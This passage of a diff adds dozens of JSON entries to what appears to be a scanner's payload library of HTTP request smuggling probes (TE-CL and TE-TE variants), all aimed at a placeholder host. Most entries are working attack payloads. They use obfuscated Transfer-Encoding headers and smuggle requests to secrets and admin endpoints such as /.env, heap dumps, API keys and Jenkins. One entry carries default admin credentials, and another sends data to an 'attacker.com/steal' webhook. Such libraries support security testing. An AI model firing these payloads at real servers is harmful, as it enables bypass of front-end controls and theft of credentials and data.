+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #22",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "64",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #23",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /.env HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Environment": "exposed"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #24",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /backup.zip HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Backup": "download"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #25",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "93",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #26",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST /webhook HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/json",
+      "Content-Length": "42"
+    },
+    "body": "{\"url\":\"http://attacker.com/steal\"}\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #27",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "69",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #28",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /debug HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Debug": "true",
+      "X-Trace": "enabled"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #29",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "7b",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #30",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /metrics HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Authorization": "Basic YWRtaW46YWRtaW4="
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #31",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /health HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Internal": "check"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #32",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST /api/oauth/token HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "36"
+    },
+    "body": "grant_type=client_credentials\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #33",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /phpinfo.php HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-PHP": "info"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #34",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /server-status HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Apache": "status"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #35",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "7c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #36",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /actuator/env HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Spring-Boot": "actuator"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #37",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /console HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Rails-Console": "access"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #38",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /actuator/heapdump HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Spring-Actuator": "dump"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #39",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /api/swagger.json HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-API-Docs": "exposed"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #40",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /api/v1/config HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Config": "leak"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #41",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /admin/phpMyAdmin/ HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Database": "access"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #42",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /jenkins/ HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Jenkins": "exposed"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #43",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /manager/html HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Tomcat": "manager"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #44",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /api/v2/keys HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-API": "keys"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #45",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "82",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #46",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /rest/api/2/user HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Authorization": "Bearer stolen-jira-token"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #47",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /api/users?limit=1000 HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Bulk": "export"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #1",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "3e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #2",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /admin HTTP/1.1",
+    "headers": {
+      "X-Access": "smuggled"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #3",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "42",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #4",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked",
+      "Transfer-encoding": "trailers"
+    },
+    "body": "44",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #5",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "Transfer-Encoding\\r\\n: chunked\\r\\n\\r\\n40",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #6",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /bypass HTTP/1.1",
+    "headers": {
+      "X-Bypass-WAF": "true"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #7",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked; x=y"
+    },
+    "body": "48",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #8",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /endpoint HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Test": "1"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #9",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked",
+      "TRANSFER-ENCODING": "chunked"
+    },
+    "body": "36",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #10",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /path HTTP/1.1",
+    "headers": {
+      "X-Custom": "header"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #11",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked",
+      "transfer-encoding": "chunked"
+    },
+    "body": "3e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #12",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /resource HTTP/1.1",
+    "headers": {
+      "X-Resource": "access"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #13",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunkedx"
+    },
+    "body": "42",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #14",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /api HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-API": "1"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #15",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "anything"
+    },
+    "body": "3a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #16",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /test123 HTTP/1.1",
+    "headers": {
+      "X-Test": "smuggle"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #17",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "gzip"
+    },
+    "body": "40",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #18",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /compress HTTP/1.1",
+    "headers": {
+      "X-Compressed": "false"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #19",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "deflate"
+    },
+    "body": "3c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #20",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /deflate HTTP/1.1",
+    "headers": {
+      "X-Encoding": "test"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #21",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "compress"
+    },
+    "body": "3e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #22",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /legacy HTTP/1.1",
+    "headers": {
+      "X-Legacy": "encoding"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #23",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": ""
+    },
+    "body": "32",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #24",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /empty HTTP/1.1",
+    "headers": {
+      "X-Empty": "value"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #25",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chu nked"
+    },
+    "body": "38",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #26",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /space HTTP/1.1",
+    "headers": {
+      "X-Space": "inline"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #27",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "\"chunked\""
+    },
+    "body": "3a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #28",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /quoted HTTP/1.1",
+    "headers": {
+      "X-Quoted": "header"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #29",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked\\x0d\\x0a"
+    },
+    "body": "44",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #30",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /hex HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Hex": "escape"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #31",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked\\r\\n"
+    },
+    "body": "46",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #32",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /crlf HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-CRLF": "injection"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #33",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": ",,chunked"
+    },
+    "body": "3c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #34",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /comma HTTP/1.1",
+    "headers": {
+      "X-Comma": "prefix"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #35",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked,,"
+    },
+    "body": "3c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #36",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /comma2 HTTP/1.1",
+    "headers": {
+      "X-Comma": "suffix"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #37",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "foo, chunked"
+    },
+    "body": "40",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #38",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /multi2 HTTP/1.1",
+    "headers": {
+      "X-Multiple": "encoding"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #39",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked, bar"
+    },
+    "body": "42",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #40",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /multi3 HTTP/1.1",
+    "headers": {
+      "X-Multiple": "encoding2"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #41",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "identity",
+      "X-Transfer-Encoding": "chunked"
+    },
+    "body": "50",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #42",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /confusion HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Confuse": "headers"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #43",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chUnKed"
+    },
+    "body": "3a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #44",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /case HTTP/1.1",
+    "headers": {
+      "X-Case": "mixed"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #45",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "CHUNKED"
+    },
+    "body": "3a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #46",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /upper HTTP/1.1",
+    "headers": {
+      "X-Upper": "case"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #47",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "ChUnKeD"
+    },
+    "body": "3c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #48",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /random HTTP/1.1",
+    "headers": {
+      "X-Random": "case"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #49",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked\\x00"
+    },
+    "body": "3e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #50",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /null HTTP/1.1",
+    "headers": {
+      "X-Null": "byte"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #51",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "\\x0bchunked"
+    },
+    "body": "40",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #52",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /vtab HTTP/1.1",
+    "headers": {
+      "X-Vertical": "tab"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #53",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /space2 HTTP/1.1",
+    "headers": {
+      "X-Leading": "space"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
